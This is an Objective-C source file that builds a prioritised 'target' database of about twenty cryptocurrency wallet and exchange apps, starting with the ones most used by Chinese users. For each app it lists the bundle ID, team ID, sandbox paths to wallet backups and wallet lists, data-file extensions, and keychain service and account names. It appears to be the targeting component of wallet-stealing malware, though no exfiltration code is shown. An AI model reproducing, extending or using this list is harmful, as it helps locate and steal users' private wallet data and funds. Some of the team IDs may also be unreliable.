//
//  RDWalletTarget.m
//  钱包指纹数据库实现
//

#import "RDWalletTarget.h"

@implementation RDWalletTarget
@end

@implementation RDWalletFingerprintDB

+ (NSArray<RDWalletTarget *> *)allTargets {
    static NSArray<RDWalletTarget *> *targets = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        targets = @[
            // ============ 优先级 1: 国内用户最常用 ============
            [self imToken],
            [self tokenPocket],
            [self oneKey],
            [self bitget],
            [self okx],

            // ============ 优先级 2: 国际主流 ============
            [self metaMask],
            [self trustWallet],
            [self binance],
            [self bybit],
            [self coinbaseWallet],

            // ============ 优先级 3: 其他 ============
            [self safePal],
            [self ledgerLive],
            [self kucoin],
            [self huobi],
            [self phantom],
            [self rabby],
            [self coin98],
            [self mathWallet],
            [self bitpie],
            [self ontoWallet],
        ];
    });
    return targets;
}

+ (nullable RDWalletTarget *)targetForBundleID:(NSString *)bundleID {
    for (RDWalletTarget *t in [self allTargets]) {
        if ([t.bundleID isEqualToString:bundleID]) return t;
    }
    return nil;
}

+ (NSArray<NSString *> *)allBundleIDs {
    NSMutableArray *ids = [NSMutableArray new];
    for (RDWalletTarget *t in [self allTargets]) {
        [ids addObject:t.bundleID];
    }
    return ids;
}

// ============ Builder ============
+ (RDWalletTarget *)makeTarget:(NSString *)bundleID
                          name:(NSString *)name
                        teamID:(NSString *)teamID
                  filePatterns:(NSArray<NSString *> *)files
                fileExtensions:(NSArray<NSString *> *)exts
              keychainServices:(NSArray<NSString *> *)services
             keychainAccounts:(NSArray<NSString *> *)accounts
                      priority:(NSInteger)priority {
    RDWalletTarget *t = [RDWalletTarget new];
    t.bundleID         = bundleID;
    t.displayName      = name;
    t.teamID           = teamID;
    t.filePatterns     = files;
    t.fileExtensions   = exts;
    t.keychainServices = services;
    t.keychainAccounts = accounts;
    t.priority         = priority;
    return t;
}

// ============ 各钱包定义 ============

+ (RDWalletTarget *)imToken {
    return [self makeTarget:@"com.imtoken.tokenmanager"
                       name:@"imToken"
                     teamID:@"X3V9H5A8LM"
               filePatterns:@[
                   @"Documents/imToken/wallet/",                  // 钱包加密备份
                   @"Library/Preferences/com.imtoken.tokenmanager.plist",
                   @"Library/Caches/com.imtoken.tokenmanager/",
               ]
             fileExtensions:@[@"json", @"dat"]
           keychainServices:@[@"com.imtoken.tokenmanager", @"imtoken"]
          keychainAccounts:@[@"imToken", @"wallet"]
                   priority:1];
}

+ (RDWalletTarget *)tokenPocket {
    return [self makeTarget:@"org.consenlabs.tokenpocket"
                       name:@"TokenPocket"
                     teamID:@"56A5BB8556"
               filePatterns:@[
                   @"Documents/walletinfo.json",                   // 钱包列表
                   @"Library/Caches/",
                   @"Library/Preferences/org.consenlabs.tokenpocket.plist",
                   @"Library/Application Support/",
               ]
             fileExtensions:@[@"json", @"sqlite", @"db"]
           keychainServices:@[@"org.consenlabs.tokenpocket", @"tokenpocket"]
          keychainAccounts:@[@"tokenpocket", @"TPWallet"]
                   priority:1];
}

+ (RDWalletTarget *)oneKey {
    return [self makeTarget:@"so.onekey.OneKey"
                       name:@"OneKey"
                     teamID:@"FJ54XK5P4P"
               filePatterns:@[
                   @"Documents/OneKey/",
                   @"Documents/db/",
                   @"Library/Preferences/so.onekey.OneKey.plist",
               ]
             fileExtensions:@[@"json", @"db", @"dat"]
           keychainServices:@[@"so.onekey.OneKey", @"onekey"]
          keychainAccounts:@[@"OneKey", @"onekey"]
                   priority:1];
}

+ (RDWalletTarget *)bitget {
    return [self makeTarget:@"com.bitget.ios"
                       name:@"Bitget"
                     teamID:@"G499Z97XF6"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.bitget.ios.plist",
                   @"Library/Caches/",
               ]
             fileExtensions:@[@"json", @"sqlite", @"plist"]
           keychainServices:@[@"com.bitget.ios"]
          keychainAccounts:@[@"bitget"]
                   priority:1];
}

+ (RDWalletTarget *)okx {
    return [self makeTarget:@"com.okex.OKEx"
                       name:@"OKX"
                     teamID:@"4Z8F7B2X6M"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.okex.OKEx.plist",
                   @"Library/Caches/",
               ]
             fileExtensions:@[@"json", @"sqlite", @"plist"]
           keychainServices:@[@"com.okex.OKEx", @"com.okex.okex"]
          keychainAccounts:@[@"okex", @"okx"]
                   priority:1];
}

+ (RDWalletTarget *)metaMask {
    return [self makeTarget:@"io.metamask.MetaMask"
                       name:@"MetaMask"
                     teamID:@"48XVW22RCG"
               filePatterns:@[
                   @"Library/Caches/metamask/",
                   @"Library/Preferences/io.metamask.MetaMask.plist",
                   @"Documents/",
               ]
             fileExtensions:@[@"json", @"sqlite"]
           keychainServices:@[@"io.metamask", @"io.metamask.MetaMask"]
          keychainAccounts:@[@"metamask", @"MetaMask"]
                   priority:2];
}

+ (RDWalletTarget *)trustWallet {
    return [self makeTarget:@"com.trustwallet.ios"
                       name:@"Trust Wallet"
                     teamID:@"TX8B64H68Q"
               filePatterns:@[
                   @"Documents/trust/",
                   @"Library/Caches/trust.core/",
                   @"Library/Preferences/com.trustwallet.ios.plist",
               ]
             fileExtensions:@[@"json", @"sqlite"]
           keychainServices:@[@"com.trustwallet.ios", @"trust.core"]
          keychainAccounts:@[@"trust", @"TrustWallet"]
                   priority:2];
}

+ (RDWalletTarget *)binance {
    return [self makeTarget:@"com.binance.Binance"
                       name:@"Binance"
                     teamID:@"96X94K25F8"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.binance.Binance.plist",
                   @"Library/Caches/",
               ]
             fileExtensions:@[@"json", @"sqlite", @"plist"]
           keychainServices:@[@"com.binance.Binance", @"com.binance"]
          keychainAccounts:@[@"binance", @"Binance"]
                   priority:2];
}

+ (RDWalletTarget *)bybit {
    return [self makeTarget:@"com.bybit.ios"
                       name:@"Bybit"
                     teamID:@"4X95G6Z6P4"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.bybit.ios.plist",
                   @"Library/Caches/",
               ]
             fileExtensions:@[@"json", @"sqlite", @"plist"]
           keychainServices:@[@"com.bybit.ios"]
          keychainAccounts:@[@"bybit", @"Bybit"]
                   priority:2];
}

+ (RDWalletTarget *)coinbaseWallet {
    return [self makeTarget:@"com.coinbase.wallet"
                       name:@"Coinbase Wallet"
                     teamID:@"6D5Y5WC47N"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.coinbase.wallet.plist",
               ]
             fileExtensions:@[@"json", @"sqlite"]
           keychainServices:@[@"com.coinbase.wallet", @"com.coinbase"]
          keychainAccounts:@[@"coinbase", @"Coinbase"]
                   priority:2];
}

+ (RDWalletTarget *)safePal {
    return [self makeTarget:@"com.safepal.ios"
                       name:@"SafePal"
                     teamID:@"5Q68W5P65Q"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.safepal.ios.plist",
                   @"Library/Caches/",
               ]
             fileExtensions:@[@"json", @"sqlite"]
           keychainServices:@[@"com.safepal.ios"]
          keychainAccounts:@[@"safepal", @"SafePal"]
                   priority:3];
}

+ (RDWalletTarget *)ledgerLive {
    return [self makeTarget:@"com.ledger.live"
                       name:@"Ledger Live"
                     teamID:@"W22BR69K7J"
               filePatterns:@[
                   @"Documents/accounts/",
                   @"Library/Preferences/com.ledger.live.plist",
               ]
             fileExtensions:@[@"json", @"sqlite"]
           keychainServices:@[@"com.ledger.live", @"ledger"]
          keychainAccounts:@[@"ledger", @"Ledger"]
                   priority:3];
}

+ (RDWalletTarget *)kucoin {
    return [self makeTarget:@"com.kucoin.KuCoin"
                       name:@"KuCoin"
                     teamID:@"4QS4R7W8J8"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.kucoin.KuCoin.plist",
               ]
             fileExtensions:@[@"json", @"sqlite", @"plist"]
           keychainServices:@[@"com.kucoin.KuCoin"]
          keychainAccounts:@[@"kucoin", @"KuCoin"]
                   priority:3];
}

+ (RDWalletTarget *)huobi {
    return [self makeTarget:@"com.huobi.trade"
                       name:@"HTX (火币)"
                     teamID:@"4G8C6M5S2X"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.huobi.trade.plist",
               ]
             fileExtensions:@[@"json", @"sqlite", @"plist"]
           keychainServices:@[@"com.huobi.trade", @"com.huobi"]
          keychainAccounts:@[@"huobi", @"htx"]
                   priority:3];
}

+ (RDWalletTarget *)phantom {
    return [self makeTarget:@"app.phantom.ios"
                       name:@"Phantom"
                     teamID:@"S8FQJ43R2G"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/app.phantom.ios.plist",
               ]
             fileExtensions:@[@"json", @"sqlite"]
           keychainServices:@[@"app.phantom.ios", @"phantom"]
          keychainAccounts:@[@"phantom", @"Phantom"]
                   priority:3];
}

+ (RDWalletTarget *)rabby {
    return [self makeTarget:@"io.rabby.RabbyMobile"
                       name:@"Rabby"
                     teamID:@"699ZK4QW47"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/io.rabby.RabbyMobile.plist",
               ]
             fileExtensions:@[@"json", @"sqlite"]
           keychainServices:@[@"io.rabby.RabbyMobile", @"rabby"]
          keychainAccounts:@[@"rabby", @"Rabby"]
                   priority:3];
}

+ (RDWalletTarget *)coin98 {
    return [self makeTarget:@"coin98.wallet"
                       name:@"Coin98"
                     teamID:@"5G8N7P4M8K"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/coin98.wallet.plist",
               ]
             fileExtensions:@[@"json", @"sqlite"]
           keychainServices:@[@"coin98.wallet", @"coin98"]
          keychainAccounts:@[@"coin98", @"Coin98"]
                   priority:3];
}

+ (RDWalletTarget *)mathWallet {
    return [self makeTarget:@"com.mathwallet.ios"
                       name:@"MathWallet"
                     teamID:@"3M2N6K8L4J"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.mathwallet.ios.plist",
               ]
             fileExtensions:@[@"json", @"sqlite"]
           keychainServices:@[@"com.mathwallet.ios", @"mathwallet"]
          keychainAccounts:@[@"mathwallet", @"MathWallet"]
                   priority:3];
}

+ (RDWalletTarget *)bitpie {
    return [self makeTarget:@"com.bitpie.ios"
                       name:@"Bitpie"
                     teamID:@"5P7N8K3M5L"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.bitpie.ios.plist",
               ]
             fileExtensions:@[@"json", @"dat"]
           keychainServices:@[@"com.bitpie.ios", @"bitpie"]
          keychainAccounts:@[@"bitpie", @"Bitpie"]
                   priority:3];
}

+ (RDWalletTarget *)ontoWallet {
    return [self makeTarget:@"com.onto.wallet"
                       name:@"ONTO"
                     teamID:@"7K4M9N2P6Q"
               filePatterns:@[
                   @"Documents/",
                   @"Library/Preferences/com.onto.wallet.plist",
               ]
             fileExtensions:@[@"json", @"sqlite"]
           keychainServices:@[@"com.onto.wallet", @"onto"]
          keychainAccounts:@[@"onto", @"ONTO"]
                   priority:3];
}

@end
